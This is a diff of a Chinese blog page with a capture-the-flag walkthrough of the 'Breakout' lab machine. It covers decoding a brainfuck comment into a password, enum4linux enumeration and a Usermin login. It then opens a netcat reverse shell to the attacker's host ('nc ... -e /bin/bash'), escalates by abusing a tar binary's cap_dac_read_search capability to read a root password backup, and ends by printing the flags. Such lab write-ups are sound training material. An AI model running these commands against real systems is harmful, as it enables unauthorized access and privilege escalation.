@@ -117,30 +117,12 @@
         <li><a class="icon" aria-label="下一篇" href="/2022/05/28/Lupin_one%20Writeup/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
       </ul>
       <span id="i-prev" class="info" style="display:none;">上一篇</span>
       <span id="i-next" class="info" style="display:none;">下一篇</span>
       <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
     </span>
     <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hdfzzf.github.io/2022/05/28/Breakout%20Writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hdfzzf.github.io/2022/05/28/Breakout%20Writeup/&text=Breakout Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hdfzzf.github.io/2022/05/28/Breakout%20Writeup/&title=Breakout Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hdfzzf.github.io/2022/05/28/Breakout%20Writeup/&is_video=false&description=Breakout Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=Breakout Writeup&body=Check out this article: https://hdfzzf.github.io/2022/05/28/Breakout%20Writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hdfzzf.github.io/2022/05/28/Breakout%20Writeup/&title=Breakout Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2022/05/28/Breakout%20Writeup/&title=Breakout Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2022/05/28/Breakout%20Writeup/&title=Breakout Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2022/05/28/Breakout%20Writeup/&title=Breakout Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/05/28/Breakout%20Writeup/&name=Breakout Writeup&description=&lt;p&gt;该靶机难度不高。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2022/05/28/Breakout%20Writeup/&t=Breakout Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
     <div id="toc">
       <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">1. 靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">2. 信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF"><span class="toc-number">2.1.</span> <span class="toc-text">2.1. 端口信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%A1%B5%E4%BF%A1%E6%81%AF"><span class="toc-number">2.2.</span> <span class="toc-text">2.2. 网页信息</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#get-shell"><span class="toc-number">3.</span> <span class="toc-text">3. get shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">4.</span> <span class="toc-text">4. 权限提升</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">5. 总结</span></a></li></ol>
     </div>
@@ -167,8 +149,6 @@
     <div class="postdate">
       
         <time datetime="2022-05-27T16:00:00.000Z" itemprop="datePublished">2022-05-28</time>
-        
-        (Updated: <time datetime="2022-05-28T02:26:25.472Z" itemprop="dateModified">2022-05-28</time>)
         
       
     </div>
@@ -216,23 +196,21 @@
 <h2 id="网页信息">2.2. 网页信息</h2>
 <p>先访问80端口。主页面就是apache2安装成功后的界面，没有其他有用的信息。路径扫描结果如下图</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528083722.png" /></p>
-<p>没有有用的。查看页面源码，当翻到页面最下方的时候看到了一串注释 <pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">don't worry no one will get here, it's safe to share with you my access. Its encrypted :)
-
-++++++++++[>+>+++>+++++++>++++++++++&lt;&lt;&lt;&lt;-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.&lt;++++++++++.-----------.>-----------.++++.&lt;&lt;+.>-.--------.++++++++++++++++++++.&lt;------------.>>---------.&lt;&lt;++++++.++++++.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
-<p>意思：不要担心有人能到这里，这里是安全的，所以我要给你分享我的访问信息，它是加密的。后面就是brainfuck代码，解码之后为： <pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">.2uqPEfj3D&lt;P'a-3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>没有有用的。查看页面源码，当翻到页面最下方的时候看到了一串注释 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">don&#x27;t worry no one will get here, it&#x27;s safe to share with you my access. Its encrypted :)</span><br><span class="line"></span><br><span class="line">++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;++++++++++++++++.++++.&gt;&gt;+++++++++++++++++.----.&lt;++++++++++.-----------.&gt;-----------.++++.&lt;&lt;+.&gt;-.--------.++++++++++++++++++++.&lt;------------.&gt;&gt;---------.&lt;&lt;++++++.++++++.</span><br></pre></td></tr></table></figure></p>
+<p>意思：不要担心有人能到这里，这里是安全的，所以我要给你分享我的访问信息，它是加密的。后面就是brainfuck代码，解码之后为： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.2uqPEfj3D&lt;P&#x27;a-3</span><br></pre></td></tr></table></figure></p>
 <p>但是还不知道这是哪里的密码。</p>
 <p>10000端口和20000端口都是一个登陆界面，且使用了 ssl 加密。其中 10000 端口是 webmin 而 20000 端口是 usermin</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528084332.png" /></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528084342.png" /></p>
-<p>使用如下命令： <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">enum4linux -a <span class="token number">192.168</span>.100.24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>使用如下命令： <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enum4linux -a 192.168.100.24</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528092117.png" /></p>
-<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">cyber:.2uqPEfj3D&lt;P'a-3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyber:.2uqPEfj3D&lt;P&#x27;a-3</span><br></pre></td></tr></table></figure>
 <p>使用上述信息成功登录 usermin</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528092455.png" /></p>
 <h1 id="get-shell">3. get shell</h1>
 <p>这个后台get shell的方法很简单。</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528092531.png" /></p>
-<p>上图中红框的地方就是后台自带的命令行。然后直接使用下面命令即可反弹shell <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">nc</span> <span class="token number">192.168</span>.100.10 -e /bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>上图中红框的地方就是后台自带的命令行。然后直接使用下面命令即可反弹shell <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.100.10 -e /bin/bash</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528092645.png" /></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528092629.png" /></p>
 <h1 id="权限提升">4. 权限提升</h1>
@@ -243,26 +221,20 @@
 <p>因此，这应该就是 tar 命令。</p>
 <p>查看了 /etc/passwd 发现只有两个用户，root和cyber。</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528101341.png" /></p>
-<p>该靶机没有sudo命令，也没有suid提权。输入如下命令看一下是否有capability： <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">getcap -r / <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>该靶机没有sudo命令，也没有suid提权。输入如下命令看一下是否有capability： <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getcap -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528101507.png" /></p>
 <p>/home/cyber/tar 具有 cap_dac_read_search 的能力，该能力能够使 /home/cyber/tar 执行的时候忽略目标文件的权限限制。简单来说就是可以使用该文件去压缩没有读、写、执行权限的文件。</p>
 <p>又在 /var/backups/ 目录下找到一个 .old_pass.bak 的文件</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528101659.png" /></p>
-<p>使用下面命令将其压缩：（先回到家目录） <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">./tar -cvzf old.tar.gz /var/backups/.old_pass.bak<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>使用下面命令将其压缩：（先回到家目录） <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./tar -cvzf old.tar.gz /var/backups/.old_pass.bak</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528101919.png" /></p>
-<p>再使用下面命令将其解压： <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">./tar -xvzf old.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>再使用下面命令将其解压： <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./tar -xvzf old.tar.gz</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528102015.png" /></p>
 <p>最后进入到 /home/cyber/var/backups/ 读取 .old_pass.bak</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528102105.png" /></p>
-<p>这应该就是 root 的密码了，使用如下信息 su 成 root <pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">root:Ts&amp;4&amp;YurgtRX(=~h<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>这应该就是 root 的密码了，使用如下信息 su 成 root <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:Ts&amp;4&amp;YurgtRX(=~h</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528102211.png" /></p>
-<p>最后的最后，读取两个flag作为收尾： <pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">1. /home/cyber/user.txt
-3mp!r3&#123;You_Manage_To_Break_To_My_Secure_Access&#125;
-
-2. /root/rOOt.txt
-3mp!r3&#123;You_Manage_To_BreakOut_From_My_System_Congratulation&#125;
-
-Author: Icex64 &amp; Empire Cybersecurity<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>最后的最后，读取两个flag作为收尾： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. /home/cyber/user.txt</span><br><span class="line">3mp!r3&#123;You_Manage_To_Break_To_My_Secure_Access&#125;</span><br><span class="line"></span><br><span class="line">2. /root/rOOt.txt</span><br><span class="line">3mp!r3&#123;You_Manage_To_BreakOut_From_My_System_Congratulation&#125;</span><br><span class="line"></span><br><span class="line">Author: Icex64 &amp; Empire Cybersecurity</span><br></pre></td></tr></table></figure></p>
 <h1 id="总结">5. 总结</h1>
 <p>该靶机还算比较简单，涉及的攻击方法有：</p>
 <ol type="1">
@@ -326,7 +298,6 @@ Author: Icex64 &amp; Empire Cybersecurity<span aria-hidden="true" class="line-nu
     <div id="actions-footer">
         <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
         <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
         <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
     </div>
 
